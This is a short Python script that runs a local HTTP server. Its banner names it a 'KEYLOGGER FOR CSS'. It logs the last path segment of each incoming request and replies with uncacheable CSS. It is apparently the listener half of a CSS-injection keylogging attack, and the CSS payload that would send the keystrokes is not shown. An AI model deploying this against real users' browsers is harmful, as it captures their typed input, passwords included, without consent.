
from http.server import HTTPServer, BaseHTTPRequestHandler

ADDRESS = ('localhost', 5678)


class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        x = self.path.split("/")[-1:][0]
        print(x, flush=True)
        self.send_response(200, message="Hallo")
        self.send_header("Content-Type", "text/css")
        self.send_header("Cache-Control", "no-store,max-age=0")
        self.end_headers()
        self.wfile.write("AAA".encode())


def main() -> None:
    print(f"Starting KEYLOGGER FOR CSS | {ADDRESS}")

    server = HTTPServer(ADDRESS, MyHandler)
    try:
        print("Running ...")
        server.serve_forever()

    except KeyboardInterrupt:
        print(" \nCtrl+C detected!")

    print("END")


if __name__ == "__main__":
    main()
